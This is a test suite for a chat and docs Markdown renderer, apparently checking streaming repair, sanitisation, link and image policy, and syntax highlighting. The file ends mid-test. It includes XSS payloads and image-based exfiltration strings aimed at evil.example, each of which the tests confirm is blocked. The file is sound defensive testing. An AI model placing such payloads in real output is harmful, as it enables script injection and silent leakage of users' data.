/**
 * Streamdown renderer contract (SSR via react-dom/server), run by
 * scripts/run-tests.mjs: `npm test -- markdown`.
 *
 * Covers: streaming repair (remend), XSS in both variants, the chat link and
 * image policy (no auto-loaded off-origin images), MkDocs blocks, heading ids,
 * the incremental Shiki tokenizer for streamed fences, the streaming
 * render pacer and chat list numbering across code fences.
 */
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { renderToStaticMarkup } from 'react-dom/server'
import remend from 'remend'
import { Markdown } from './Markdown'
import { convertMkdocsBlocks, preprocessMkdocsMarkdown, replaceMkdocsIcons, stripMkdocsGridWrappers } from './mkdocsPreprocess'
import { createCuratedCodePlugin, resetShikiCaches, shikiStats } from './shikiPlugin'
import { DOCS_MATH_RE, ensureMathPlugin, MATH_RE, needsMath, SHIKI_THEMES } from './pluginLoaders'
import { normalizeTexDelimiters } from './texDelimiters'
import { MAX_STREAM_INTERVAL_MS, StreamPacer } from './streamThrottle'
import { gateMermaidSource, isAutoLoadImage, isExternalHref } from './urlPolicy'
import { continueSplitLists } from './listNumbering'
import { fenced } from './fence'
import { CHAT_CONTROLS, COPY_FAILED, DOCS_CONTROLS, reportCopyError } from './controls'

const chat = (md: string, streaming = false) => renderToStaticMarkup(<Markdown variant="chat" streaming={streaming}>{md}</Markdown>)
const docs = (md: string) => renderToStaticMarkup(<Markdown variant="docs">{preprocessMkdocsMarkdown(md)}</Markdown>)

/** All opening tags with this name, e.g. tags(html, 'a'). */
const tags = (html: string, name: string) => html.match(new RegExp(`<${name}\\b[^>]*>`, 'g')) ?? []

// ── streaming repair (remend = Streamdown's parseIncompleteMarkdown) ──
const PARTIALS: [string, (out: string) => boolean][] = [
    ['Hello **wor', (o) => o === 'Hello **wor**'],
    ['use `npm i', (o) => o === 'use `npm i`'],
    ['a *it', (o) => o === 'a *it*'],
    ['~~stri', (o) => o === '~~stri~~'],
    ['see [docs](https://exa', (o) => !o.includes('](https://exa)') || o.includes('streamdown:incomplete-link')],
    ['$$x^2', (o) => o === '$$x^2$$'],
    ['```py\nprint(1', (o) => o.startsWith('```py\nprint(1')],
]
for (const [input, ok] of PARTIALS) {
    test(`remend repairs ${JSON.stringify(input)}`, () => {
        const out = remend(input)
        assert.ok(ok(out), out)
    })
}

test('streaming render: unclosed bold renders <strong>, no literal **', () => {
    const html = chat('Hello **wor', true)
    assert.match(html, /data-streamdown="strong">wor</)
    assert.doesNotMatch(html, /\*\*/)
})

test('streaming render: unclosed fence renders a code block (not paragraph text)', () => {
    const html = chat('Here:\n\n```python\ndef f():\n    return 1', true)
    assert.match(html, /data-streamdown="code-block"/)
})

test('a finished chat message is rendered as written, not "repaired"', () => {
    // Adjacent bold markers ('****') make remend append '***' after the closing
    // fence, which turns the fence into code text. Repair is for streaming only.
    const md = 'You said: **Summarize the **release notes****\n\n```py\nprint(1)\n```'
    assert.match(remend(md), /```\*\*\*$/, 'the upstream repair still corrupts this text')
    const html = chat(md)
    assert.match(html, /data-streamdown="code-block"/)
    assert.doesNotMatch(html, /```/, 'the closing fence closes the block')
    assert.doesNotMatch(html, /\*\*\*/)
})

test('streaming render: half table header still renders table', () => {
    const html = chat('| a | b |\n| - | - |\n| 1 |', true)
    assert.match(html, /<table/)
})

// ── XSS (both variants) ──
const XSS = [
    '<script>alert(1)</script>',
    '<img src=x onerror="alert(1)">',
    '[click](javascript:alert(1))',
    '<a href="javascript:alert(1)">x</a>',
    '<iframe src="https://evil.example"></iframe>',
    '<svg onload="alert(1)"><circle/></svg>',
    '<div style="background:url(javascript:alert(1))" onclick="alert(1)">x</div>',
    '[x](  JaVaScRiPt:alert(1))',
    '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">d</a>',
    '<form action="https://evil"><input name=p></form>',
    '<details open ontoggle="alert(1)"><summary>s</summary></details>',
]
for (const payload of XSS) {
    for (const [name, render] of [['chat', (m: string) => chat(m)], ['docs', docs]] as const) {
        test(`xss ${name}: ${payload.slice(0, 40)}`, () => {
            const html = render(payload)
            assert.doesNotMatch(html, /<script/i)
            assert.doesNotMatch(html, /\son[a-z]+=/i)
            assert.doesNotMatch(html, /href="\s*javascript:/i)
            assert.doesNotMatch(html, /href="data:text\/html/i)
            assert.doesNotMatch(html, /<iframe|<form|<svg/i)
            assert.doesNotMatch(html, /style="[^"]*javascript/i)
        })
    }
}

// ── docs / mkdocs ──
test('mkdocs admonition renders with title + inner markdown + intact code', () => {
    const md = '# T\n\n!!! warning "Blocked Types"\n    Some **bold** text.\n\n    ```python\n    a = 1\n\n    b = 2\n    ```\n\nAfter.'
    const html = docs(md)
    assert.match(html, /aiui-admonition/)
    assert.match(html, /Blocked Types/)
    assert.match(html, /data-streamdown="strong">bold</)
    assert.doesNotMatch(html, /&lt;!----&gt;|<!---->/)
    assert.match(html, /a = 1<\/span><\/span><span[^>]*>\n<\/span><span[^>]*><span[^>]*>b = 2|a = 1[\s\S]{0,400}b = 2/)
    // the blank line between the two statements survives (no allowedTags rewrite)
    assert.match(html, /a = 1(?:<[^>]*>)*\n(?:<[^>]*>)*\n?(?:<[^>]*>)*b = 2|a = 1[^b]*\n[^b]*\n[^b]*b = 2/)
    assert.doesNotMatch(html, /!!!/)
})

test('mkdocs collapsible ??? renders <details>', () => {
    const html = docs('??? note "More"\n    hidden body')
    assert.match(html, /<details[^>]*class="[^"]*aiui-admonition/)
    assert.match(html, /<summary[^>]*>More<\/summary>/)
})

test('mkdocs tabs render a tablist with both titles', () => {
    const md = '=== "Python"\n\n    ```python\n    print(1)\n    ```\n\n=== "Shell"\n\n    ```bash\n    echo hi\n    ```\n\nDone.'
    const html = docs(md)
    assert.match(html, /role="tablist"/)
    assert.match(html, />Python<\/button>/)
    assert.match(html, />Shell<\/button>/)
    assert.match(html, /print\(1\)/)
    assert.match(html, /echo hi/)
    assert.doesNotMatch(html, /tab:/)
})

test('fenced code containing === / !!! is left alone', () => {
    const html = docs('```text\n=== "Not a tab"\n!!! note\n```')
    assert.doesNotMatch(html, /tablist|aiui-admonition/)
    assert.match(html, /=== &quot;Not a tab&quot;/)
})

test('mermaid fence becomes a mermaid block, not a code block', () => {
    const html = docs('```mermaid\ngraph TD; A-->B\n```')
    assert.doesNotMatch(html, /data-streamdown="code-block"/)
})

test('gfm table + task list + strikethrough + autolink', () => {
    const html = chat('| a |\n|---|\n| 1 |\n\n- [x] done\n\n~~gone~~ https://example.com')
    assert.match(html, /<table/)
    assert.match(html, /type="checkbox"/)
    assert.match(html, /<del[^>]*>gone<\/del>/)
    // owner decision: chat links are real <a> (no confirmation modal)
    assert.match(html, /<a [^>]*href="https:\/\/example.com\/?"[^>]*>https:\/\/example.com<\/a>/)
    assert.doesNotMatch(html, /<button[^>]*data-streamdown="link"/)
})

test('docs links stay real <a href> with SPA-normalised internal hrefs', () => {
    const html = docs('[guide](./getting-started.md) and [ext](https://example.com)')
    assert.match(html, /<a [^>]*href="[^"]*getting-started[^"]*"/)
    assert.match(html, /<a [^>]*href="https:\/\/example.com\/?"/)
})

test('docs heading ids use slugify over full text incl. inline code', () => {
    const html = docs('## Install `aiui` now')
    assert.match(html, /<h2 [^>]*id="install-aiui-now"/)
})

// ── chat link policy (owner decision 1) ──
test('chat external link: new tab, rel="noopener noreferrer nofollow"', () => {
    const [a] = tags(chat('[site](https://example.com/page)'), 'a')
    assert.ok(a, 'renders an <a>')
    assert.match(a, /href="https:\/\/example.com\/page"/)
    assert.match(a, /target="_blank"/)
    assert.match(a, /rel="noopener noreferrer nofollow"/)
})

test('chat same-origin and #fragment links stay in the tab', () => {
    for (const md of ['[s](/sessions/abc)', '[top](#intro)']) {
        const [a] = tags(chat(md), 'a')
        assert.ok(a, md)
        assert.doesNotMatch(a, /target=/, md)
        assert.doesNotMatch(a, /nofollow/, md)
    }
})

test('chat link still streaming renders as text, never href="streamdown:…"', () => {
    const html = chat('see [docs](https://exa', true)
    assert.doesNotMatch(html, /href="streamdown:/)
    assert.match(html, /data-incomplete="true"/)
})

test('docs external link opens in a new tab; internal does not', () => {
    const html = docs('[ext](https://example.com) [in](/docs/guide)')
    const anchors = tags(html, 'a')
    assert.equal(anchors.length, 2)
    assert.match(anchors[0], /target="_blank"/)
    assert.doesNotMatch(anchors[1], /target=/)
})

// ── chat image policy: exfiltration guard ──
test('exfiltration: ![](https://evil/?q=x) produces no <img src=https://evil>', () => {
    const html = chat('Summary ![x](https://evil.example/?q=SECRET)')
    assert.equal(tags(html, 'img').length, 0, html)
    assert.doesNotMatch(html, /<img[^>]*evil\.example/)
    assert.match(html, /data-aiui-image-gate="click-to-load"/)
    assert.match(html, /evil\.example/) // the placeholder names the host
})

test('exfiltration: raw <img>, protocol-relative and <picture><source> are gated too', () => {
    for (const md of [
        '<img src="https://evil.example/a.png?d=SECRET">',
        '![a](//evil.example/a.png)',
        '<picture><source srcset="https://evil.example/s.png?d=SECRET"><img src="/ok.png" alt="ok"></picture>',
    ]) {
        const html = chat(md)
        assert.doesNotMatch(html, /<(img|source)[^>]*evil\.example/i, md)
        assert.doesNotMatch(html, /srcset/i, md)
    }
})

test('chat images: same-origin, data:image/ and blob: auto-load; data:text does not', () => {
    assert.match(chat('![a](/api/files/a.png)'), /<img[^>]*src="\/api\/files\/a.png"/)
    assert.match(chat('![p](data:image/png;base64,iVBORw0KGgo=)'), /<img[^>]*src="data:image\/png;base64,iVBORw0KGgo="/)
    const html = chat('<img src="data:text/html;base64,PHNjcmlwdD4=">')
    assert.equal(tags(html, 'img').length, 0, html)
    assert.match(html, /data-aiui-image-gate="blocked"/)
})

test('inline images stay phrasing content (no <div> inside <p>)', () => {
    for (const html of [chat('text ![a](/i.png) more'), docs('text ![a](https://cdn.example.com/a.png) more')]) {
        const p = html.match(/<p\b[^>]*>([\s\S]*?)<\/p>/)
        assert.ok(p, html)
        assert.match(p[1], /<img[^>]*src=/)
        assert.doesNotMatch(p[1], /<div/)
    }
})

test('an image whose URL is still streaming shows a skeleton and never fetches', () => {
    const html = chat('look ![chart](https://exa', true)
    assert.equal(tags(html, 'img').length, 0, html)
    assert.doesNotMatch(html, /<p\b[^>]*>(?:(?!<\/p>)[\s\S])*<div/)
    assert.match(html, /data-streamdown="image-placeholder"/)
})

test('math: chat loads KaTeX for $$ and for \\(…\\) / \\[…\\]; never for prices', () => {
    assert.ok(MATH_RE.test('inline $$x^2$$'))
    assert.ok(needsMath('inline $$x^2$$'))
    assert.ok(needsMath('Einstein: \\(E = mc^2\\)'))
    assert.ok(needsMath('\\[\\int_0^1 x\\,dx\\]'))
    assert.ok(!needsMath('costs $5 or $6'))
    assert.ok(!needsMath('Inline math $E = mc^2$'), 'single dollars stay text in chat')
})

test('math: docs also render single-dollar inline math, but not prices', () => {
    assert.ok(needsMath('Inline math $E = mc^2$', 'docs'))
    assert.ok(DOCS_MATH_RE.test('see $x$.'))
    assert.ok(!DOCS_MATH_RE.test('costs $5 or $6'))
    assert.ok(!DOCS_MATH_RE.test('between $ 5 and 6 $'))
})

test('TeX delimiters: \\[…\\] and \\(…\\) become $$ outside code only', () => {
    assert.equal(normalizeTexDelimiters('a \\(x^2\\) b'), 'a $$x^2$$ b')
    assert.equal(normalizeTexDelimiters('\\[\n\\sum_i i\n\\]'), '\n$$\n\\sum_i i\n$$\n')
    const fenced = '```js\nconst re = /\\(x\\)/\n```'
    assert.equal(normalizeTexDelimiters(fenced), fenced)
    assert.equal(normalizeTexDelimiters('use `\\(a\\)` here'), 'use `\\(a\\)` here')
    assert.equal(normalizeTexDelimiters('open \\( only'), 'open \\( only', 'an unclosed pair is left alone')
    assert.equal(normalizeTexDelimiters('plain text'), 'plain text')
})

test('chat renders \\(…\\) through KaTeX once the plugin is loaded', async () => {
    await ensureMathPlugin('chat')
    const html = chat('Einstein: \\(E = mc^2\\)')
    assert.match(html, /class="katex/)
    await ensureMathPlugin('docs')
    assert.match(docs('Inline math $E = mc^2$'), /class="katex/)
})

test('docs images (site-authored) load from any host', () => {
    assert.match(docs('![d](https://cdn.example.com/a.png)'), /<img[^>]*src="https:\/\/cdn.example.com\/a.png"/)
})

test('url policy helpers', () => {
    assert.equal(isAutoLoadImage('https://evil.example/a.png'), false)
    assert.equal(isAutoLoadImage('/a.png'), true)
    assert.equal(isAutoLoadImage('blob:http://aiui.invalid/123'), true)
    assert.equal(isAutoLoadImage('DATA:image/png;base64,AA=='), true)
    assert.equal(isAutoLoadImage('javascript:alert(1)'), false)
    assert.equal(isExternalHref('mailto:a@b.c'), true)
    assert.equal(isExternalHref('#x'), false)
    assert.equal(isExternalHref('./x'), false)
})

test('chat mermaid source: off-origin url() and img: sources are neutralised', () => {
    const src = [
        'graph TD',
        '  A@{ img: "https://evil.example/a.png?q=SECRET", label: "x" }',
        "  B@{ img: '/static/ok.png' }",
        '  classDef bad fill:url(https://evil.example/f.svg#p),stroke:url("#grad")',
        '  style A background-image: url( "//evil.example/b.png" )',
        '%%{init: {"themeCSS": "@import url(https://evil.example/c.css); .node{}"}}%%',
    ].join('\n')
    const out = gateMermaidSource(src)
    assert.doesNotMatch(out, /evil\.example/, out)
    assert.match(out, /img: "data:image\/gif;base64,/)
    assert.match(out, /img: '\/static\/ok\.png'/) // same origin stays
    assert.match(out, /url\("#grad"\)/) // in-document paint servers stay
    assert.doesNotMatch(out, /@import/)
})

test('chat does not accept docs-only <aiui-*> tags', () => {
    const html = chat('<aiui-admonition type="warning" title="t">hi</aiui-admonition>')
    assert.doesNotMatch(html, /role="note"|aiui-admonition/)
})

// ── look / contract ──
test('both variants render body text with the foreground token (light-mode contrast)', () => {
    for (const html of [chat('para'), docs('para\n\n| a |\n|---|\n| 1 |')]) {
        const root = html.match(/^<div[^>]*class="([^"]*)"/)
        assert.ok(root, html.slice(0, 200))
        assert.match(root[1], /\btext-foreground\b/)
        assert.match(root[1], /\bmin-w-0\b/)
    }
})

test('docs feature lists (bold first item) render as a card grid; plain lists do not', () => {
    assert.match(docs('- **YAML-Driven** config\n- **Fast** builds'), /aiui-feature-grid/)
    assert.doesNotMatch(docs('- one\n- two'), /aiui-feature-grid/)
})

test('preprocess is fence-aware: wrappers and icons inside code are kept', () => {
    const md = 'Use :material-check: here\n\n```html\n<div class="grid" markdown>\n:material-check:\n</div>\n```\n<div class="grid cards" markdown>\n\n- item\n\n</div>'
    const out = stripMkdocsGridWrappers(replaceMkdocsIcons(md))
    assert.match(out, /Use ✅ here/)
    assert.match(out, /```html\n<div class="grid" markdown>\n:material-check:\n<\/div>\n```/)
    assert.doesNotMatch(out.split('```').at(-1) ?? '', /<\/?div/)
})

test('mkdocs titles may contain escaped quotes (admonitions and tabs)', () => {
    const out = convertMkdocsBlocks('!!! note "He said \\"hi\\""\n    body\n\n=== "Say \\"x\\""\n\n    tab')
    assert.match(out, /<aiui-admonition type="note" title="He said &quot;hi&quot;">/)
    assert.match(out, /<aiui-tab title="Say &quot;x&quot;">/)
    const html = docs('!!! note "He said \\"hi\\""\n    body text')
    assert.match(html, /role="note" aria-label="He said &quot;hi&quot;"/)
    assert.doesNotMatch(html, /!!!/)
})

test('convertMkdocsBlocks nests an admonition inside a tab', () => {
    const out = convertMkdocsBlocks('=== "A"\n\n    !!! tip\n        inner\n\n=== "B"\n\n    b')
    assert.match(out, /<aiui-tabs>[\s\S]*<aiui-tab title="A">[\s\S]*<aiui-admonition type="tip"[\s\S]*inner[\s\S]*<\/aiui-tab>[\s\S]*<aiui-tab title="B">/)
})

// ── chat: ordered steps split by code fences keep counting ──
const SPLIT_STEPS = 'Steps:\n\n1. Install\n\n```bash\npip install x\n```\n\n1. Run\n\n```bash\nx run\n```\n\n1. Done'

test('chat: lazily numbered steps split by code fences render 1., 2., 3. (<ol start>)', () => {
    const ols = tags(chat(SPLIT_STEPS), 'ol')
    assert.equal(ols.length, 3, ols.join('\n'))
    assert.doesNotMatch(ols[0], /\sstart=/)
    assert.match(ols[1], /\sstart="2"/)
    assert.match(ols[2], /\sstart="3"/)
    // also while the answer is still streaming
    assert.match(tags(chat(SPLIT_STEPS, true), 'ol')[2] ?? '', /\sstart="3"/)
})

test('docs keep the author\'s list numbers (no renumbering pre-pass)', () => {
    const ols = tags(docs(SPLIT_STEPS), 'ol')
    assert.equal(ols.length, 3)
    assert.ok(ols.every((o) => !/\sstart=/.test(o)), ols.join('\n'))
})

test('continueSplitLists: fences are opaque, numbers count on across them', () => {
    assert.equal(
        continueSplitLists('1. a\n\n```py\n1. not a list\n```\n\n1. b\n\n~~~\n````\n1. x\n~~~\n\n1. c'),
        '1. a\n\n```py\n1. not a list\n```\n\n2. b\n\n~~~\n````\n1. x\n~~~\n\n3. c',
    )
    // a longer fence is only closed by an equally long one
    assert.equal(continueSplitLists('1. a\n\n````md\n```\n1. y\n```\n````\n\n1. b'), '1. a\n\n````md\n```\n1. y\n```\n````\n\n2. b')
})

test('continueSplitLists: explicit start, paragraphs, nesting and indented code', () => {
    assert.equal(continueSplitLists('5. five\n\n```\nx\n```\n\n1. six'), '5. five\n\n```\nx\n```\n\n6. six')
    // a paragraph (or heading, quote, bullet) at the margin starts a fresh list
    assert.equal(continueSplitLists('1. a\n\nThen:\n\n1. b'), '1. a\n\nThen:\n\n1. b')
    assert.equal(continueSplitLists('1. a\n\n## Next\n\n1. b'), '1. a\n\n## Next\n\n1. b')
    // nested lists count on their own; continuation lines keep the list open
    assert.equal(
        continueSplitLists('1. a\n   more text\n   1. x\n   1. y\n1. b\n2) p\n1) q'),
        '1. a\n   more text\n   1. x\n   2. y\n2. b\n3) p\n4) q',
    )
    // outside a list, 4+ columns is an indented code block: untouched
    assert.equal(continueSplitLists('code:\n\n    1. one\n    1. two'), 'code:\n\n    1. one\n    1. two')
    const plain = 'No lists here, 2024 was a year.'
    assert.equal(continueSplitLists(plain), plain)
})

test('chat: CRLF text numbers split steps like LF text does', () => {
    const crlf = SPLIT_STEPS.replace(/\n/g, '\r\n')
    for (const streaming of [false, true]) {
        const ols = tags(chat(crlf, streaming), 'ol')
        assert.equal(ols.length, 3, ols.join('\n'))
        assert.doesNotMatch(ols[0], /\sstart=/)
        assert.match(ols[1], /\sstart="2"/)
        assert.match(ols[2], /\sstart="3"/)
    }
    // the verifier's exact case; only the digits change, every \r\n is kept
    assert.equal(
        continueSplitLists('1. a\r\n\r\n```bash\r\nx\r\n```\r\n\r\n1. b\r\n\r\n```bash\r\ny\r\n```\r\n\r\n1. c'),
        '1. a\r\n\r\n```bash\r\nx\r\n```\r\n\r\n2. b\r\n\r\n```bash\r\ny\r\n```\r\n\r\n3. c',
    )
    // an item that is only its marker, and a fence with trailing spaces, both before \r
    assert.equal(continueSplitLists('1.\r\n```\r\nx\r\n```  \r\n1.\r\n'), '1.\r\n```\r\nx\r\n```  \r\n2.\r\n')
})

test('chat: a wrapped paragraph line that starts with a number does not start a list', () => {
    const wrapped = 'It was released in\n2023. Since then:\n\n1. foo\n2. bar'
    assert.equal(continueSplitLists(wrapped), wrapped)
    const html = chat(wrapped)
    const ols = tags(html, 'ol')
    assert.equal(ols.length, 1, html)
    assert.doesNotMatch(ols[0], /\sstart=/)
    assert.match(html, /2023\. Since then:/)
    // lazy numbering after such a paragraph still counts from 1
    assert.equal(
        continueSplitLists('Out in\r\n2023. Then:\r\n\r\n1. a\r\n\r\n```\r\nx\r\n```\r\n\r\n1. b'),
        'Out in\r\n2023. Then:\r\n\r\n1. a\r\n\r\n```\r\nx\r\n```\r\n\r\n2. b',
    )
    // only `1.` interrupts a paragraph; after a blank line or a heading any number starts a list
    assert.equal(continueSplitLists('Intro\n1. a\n1. b'), 'Intro\n1. a\n2. b')
    assert.equal(continueSplitLists('Intro\n\n7. a\n1. b'), 'Intro\n\n7. a\n8. b')
    assert.equal(continueSplitLists('## Steps\n7. a\n1. b'), '## Steps\n7. a\n8. b')
    // text right under an item is that item's lazy continuation: the list stays open
    assert.equal(
        continueSplitLists('1. a\nwrapped in\n2023. b\n\n```\nx\n```\n\n1. c'),
        '1. a\nwrapped in\n2. b\n\n```\nx\n```\n\n3. c',
    )
})

// ── fenced code keeps its language class for Streamdown ──
for (const [name, render] of [['chat', (m: string) => chat(m)], ['docs', docs]] as const) {
    test(`${name}: fenced code keeps its language`, () => {
        const html = render('```python\nimport os\n\nprint(os.getcwd())\n```\n\n```\nplain\n```')
        const bodies = [...html.matchAll(/<div class="([^"]*)" data-language="([^"]*)" data-streamdown="code-block-body"/g)]
        assert.equal(bodies.length, 2, html)
        assert.equal(bodies[0][2], 'python')
        assert.match(html, /data-streamdown="code-block-header"[^>]*><span[^>]*>python<\/span>/)
    })
}

test('the markdown root opts out of @tailwindcss/typography (not-prose)', () => {
    for (const html of [chat('para'), docs('para')]) {
        const root = html.match(/^<div[^>]*class="([^"]*)"/)
        assert.ok(root)
        assert.match(root[1], /\bnot-prose\b/)
    }
})

// ── Shiki: streamed fences are tokenized incrementally ──
const PY = [
    'def handler_N(event, context):',
    '    """Process event N.',
    '    The docstring spans lines, so grammar state must carry over.',
    '    """',
    '    total = sum(x * N for x in range(10))  # comment N',
    '    return {"id": N, "ok": True, "msg": f"done {total}"}',
    '',
]

async function warmPlugin() {
    const plugin = createCuratedCodePlugin(SHIKI_THEMES)
    await new Promise<void>((resolve) => {
        const r = plugin.highlight({ code: 'x = 1', language: 'python', themes: SHIKI_THEMES, isIncomplete: false }, () => resolve())
        if (r) resolve()
    })
    return plugin
}

type Tok = { content: string; htmlStyle?: Record<string, string>; color?: string }
const flat = (tokens: Tok[][]) => tokens.map((line) => line.map((t) => `${t.content}|${JSON.stringify(t.htmlStyle ?? t.color ?? '')}`).join(' '))

test('shiki streaming: a 2,000-line fence is tokenized in O(n) and each update fits a frame', async () => {
    resetShikiCaches()
    const plugin = await warmPlugin()
    const full = Array.from({ length: 2000 }, (_, i) => PY[i % PY.length].replaceAll('N', String(i))).join('\n')

    shikiStats.tokenizedChars = 0
    const durations: number[] = []
    let last: ReturnType<typeof plugin.highlight> = null
    let calls = 0
    for (let end = 0; end < full.length;) {
        end = Math.min(full.length, end + 3 + (calls % 10)) // token-sized steps of 3..12 chars
        const t0 = performance.now()
        last = plugin.highlight({ code: full.slice(0, end), language: 'python', themes: SHIKI_THEMES, isIncomplete: true })
        durations.push(performance.now() - t0)
        assert.ok(last, `synchronous result once the grammar is loaded (call ${calls})`)
        calls++
    }
    durations.sort((a, b) => a - b)
    const p50 = durations[Math.floor(durations.length * 0.5)]
    const p95 = durations[Math.floor(durations.length * 0.95)]
    const p99 = durations[Math.floor(durations.length * 0.99)]
    console.log(`  ${calls} streamed updates over ${full.length} chars: p50 ${p50.toFixed(3)} ms, p95 ${p95.toFixed(3)} ms, p99 ${p99.toFixed(3)} ms, max ${durations.at(-1)!.toFixed(1)} ms; tokenized ${shikiStats.tokenizedChars} chars`)

    // O(n): each completed line once, plus the partial tail per update. Full
    // re-tokenization would be ~calls × n / 2 ≈ 2.6e8 chars here.
    assert.ok(shikiStats.tokenizedChars < full.length * 8, `tokenized ${shikiStats.tokenizedChars} chars for ${full.length}`)
    // Frame budget (16 ms at 60 Hz) for the highlight step of an update.
    // p95, not p99/max: GC pauses and a loaded CI host add outliers that are not
    // the tokenizer's cost (the tokenized-chars bound above is the exact check).
    assert.ok(p95 < 16, `p95 ${p95} ms`)
    assert.ok(p50 < 4, `p50 ${p50} ms`)
    assert.equal(last!.tokens.length, 2000)

    // The incremental result equals a from-scratch tokenization.
    resetShikiCaches()
    const whole = plugin.highlight({ code: full, language: 'python', themes: SHIKI_THEMES, isIncomplete: false })
    assert.ok(whole)
    assert.deepEqual(flat(last!.tokens as Tok[][]), flat(whole.tokens as Tok[][]))
})

test('shiki: dual theme tokens carry --shiki-dark; unknown languages render as text', async () => {
    resetShikiCaches()
    const plugin = await warmPlugin()
    const r = plugin.highlight({ code: 'def f(): pass', language: 'py', themes: SHIKI_THEMES, isIncomplete: false })
    assert.ok(r)
    const styles = (r.tokens as Tok[][]).flat().map((t) => JSON.stringify(t.htmlStyle ?? {}))
    assert.ok(styles.some((s) => s.includes('--shiki-dark')), styles.join(','))
    assert.equal(plugin.supportsLanguage('cobol'), false)
    const plain = await new Promise<NonNullable<ReturnType<typeof plugin.highlight>>>((resolve) => {
        const s = plugin.highlight({ code: 'MOVE A TO B', language: 'cobol', themes: SHIKI_THEMES, isIncomplete: false }, resolve)
        if (s) resolve(s)
    })
    assert.equal((plain.tokens as Tok[][]).flat().map((t) => t.content).join(''), 'MOVE A TO B')
})

// ── streaming render pacing (a long fence must not saturate the main thread) ──
function fakeClock() {
    let t = 0
    const FRAME = 16
    const queue: { at: number; fn: () => void; dead: boolean }[] = []
    return {
        clock: {
            now: () => t,
            schedule(fn: () => void, ms: number) {
                const job = { at: t + Math.max(FRAME, ms), fn, dead: false }
                queue.push(job)
                return () => { job.dead = true }
            },
        },
        /** Advance time, running due jobs in order. */
        advance(ms: number) {
            const end = t + ms
            for (;;) {
                const next = queue.filter((j) => !j.dead && j.at <= end).sort((a, b) => a.at - b.at)[0]
                if (!next) break
                t = next.at
                next.dead = true
                next.fn()
            }
            t = end
        },
        pending: () => queue.filter((j) => !j.dead).length,
    }
}

test('stream pacer: cheap updates land every frame, coalesced to the latest text', () => {
    const fc = fakeClock()
    const shown: string[] = []
    const pacer = new StreamPacer((s) => shown.push(s), fc.clock)
    pacer.push('a')
    pacer.push('ab')
    pacer.push('abc')
    assert.equal(fc.pending(), 1, 'one pending update for three pushes')
    fc.advance(16)
    assert.deepEqual(shown, ['abc'])
    pacer.measured(1) // 1 ms renders: 1 × 2 passes / 0.25 share = 8 ms, under one frame
    pacer.push('abcd')
    fc.advance(16)
    assert.deepEqual(shown, ['abc', 'abcd'])
})

test('stream pacer: expensive updates are spaced by their cost (capped); the final text is immediate', () => {
    const fc = fakeClock()
    const shown: string[] = []
    // Every update renders in 10 ms and commits right away.
    const pacer: StreamPacer = new StreamPacer((s) => {
        shown.push(s)
        pacer.measured(10)
    }, fc.clock)
    pacer.push('x')
    fc.advance(16)
    assert.equal(pacer.interval(), 80) // 10 ms × 2 / 0.25 = 80 ms between updates
    let text = 'x'
    for (let i = 0; i < 60; i++) {
        text += 'y'
        pacer.push(text) // one token per frame for ~1 s
        fc.advance(16)
    }
    // ~960 ms at one update per 80 ms, instead of 60 updates
    assert.ok(shown.length >= 11 && shown.length <= 14, `updates: ${shown.length}`)
    assert.ok((shown.at(-1)?.length ?? 0) >= text.length - 6, 'the shown text trails by at most one interval')
    pacer.measured(500)
    assert.equal(pacer.interval(), MAX_STREAM_INTERVAL_MS)
    pacer.push(`${text}z`)
    pacer.flush(`${text}zz`) // streaming ended
    assert.equal(shown.at(-1), `${text}zz`)
    fc.advance(1000)
    assert.equal(shown.at(-1), `${text}zz`, 'the cancelled update never lands after the final text')
})

test('stream pacer: the spacing counts from the commit of the last update, not its start', () => {
    const fc = fakeClock()
    const shown: { text: string; at: number }[] = []
    const pacer = new StreamPacer((text) => shown.push({ text, at: fc.clock.now() }), fc.clock)
    pacer.push('a')
    fc.advance(16) // emitted at t=16; rendering it takes 150 ms
    pacer.push('ab') // tokens keep arriving while it renders
    fc.advance(150)
    pacer.measured(150) // committed at t=166
    const interval = pacer.interval()
    assert.equal(interval, MAX_STREAM_INTERVAL_MS, '150 ms × 2 / 0.25 = 1200 ms, capped')
    fc.advance(interval - 1)
    assert.equal(shown.length, 1, 'no update before the interval has passed since the commit')
    fc.advance(32)
    assert.equal(shown.length, 2)
    assert.equal(shown[1].text, 'ab')
    assert.ok(shown[1].at >= 166 + interval, `next update at ${shown[1].at}`)
    // Main-thread share for this fence: 150 ms busy per (150 + interval) ms.
    assert.ok(150 / (150 + interval) <= 0.25)
})

test('stream pacer: an update that never reports a commit does not stall the stream', () => {
    const fc = fakeClock()
    const shown: string[] = []
    const pacer = new StreamPacer((s) => shown.push(s), fc.clock)
    pacer.push('a')
    fc.advance(16)
    pacer.push('ab') // waits for the commit of 'a', which never comes
    fc.advance(MAX_STREAM_INTERVAL_MS - 32)
    assert.deepEqual(shown, ['a'])
    fc.advance(64)
    assert.deepEqual(shown, ['a', 'ab'])
})

test('streaming chat message renders its whole text on first render (no paced blank frame)', () => {
    const md = 'Partial **answer** so far'
    assert.match(chat(md, true), /Partial <[^>]*data-streamdown="strong">answer</)
    assert.match(chat(md, true), /so far/)
})

// ── code as data (chat `code` elements, the `code` block): one renderer ──
test('fenced(): the fence outgrows any backtick run in the code; unsafe language names are dropped', () => {
    assert.equal(fenced('print(1)', 'python'), '```python\nprint(1)\n```')
    assert.equal(fenced('a ```` b', 'md'), '`````md\na ```` b\n`````')
    assert.equal(fenced('x', 'py\n```html'), '```\nx\n```')
})

test('a chat code element renders as a Streamdown code block (language label, controls), not a bare <pre>', () => {
    const html = chat(fenced('def f():\n    return "```"', 'python'))
    assert.match(html, /data-streamdown="code-block"/)
    assert.match(html, /data-streamdown="code-block-header"[^>]*><span[^>]*>python<\/span>/)
    assert.match(html, /return/)
})

// ── footnotes: ids are unique per message (LIBMD-4) ──
test('two messages with footnotes: every id is unique and each footnote link targets its own message', () => {
    const html = renderToStaticMarkup(
        <div>
            <section><Markdown variant="chat">{'First[^1]\n\n[^1]: one'}</Markdown></section>
            <section><Markdown variant="chat">{'Second[^1]\n\n[^1]: two'}</Markdown></section>
        </div>,
    )
    const ids = [...html.matchAll(/\sid="([^"]+)"/g)].map((m) => m[1])
    assert.ok(ids.length >= 6, `footnote ids rendered: ${ids.join(', ')}`)
    assert.equal(new Set(ids).size, ids.length, `duplicate ids: ${ids.join(', ')}`)
    for (const part of html.split('<section>').slice(1)) {
        const own = new Set([...part.matchAll(/\sid="([^"]+)"/g)].map((m) => m[1]))
        const hrefs = [...part.matchAll(/href="\\?#([^"]+)"/g)].map((m) => m[1])
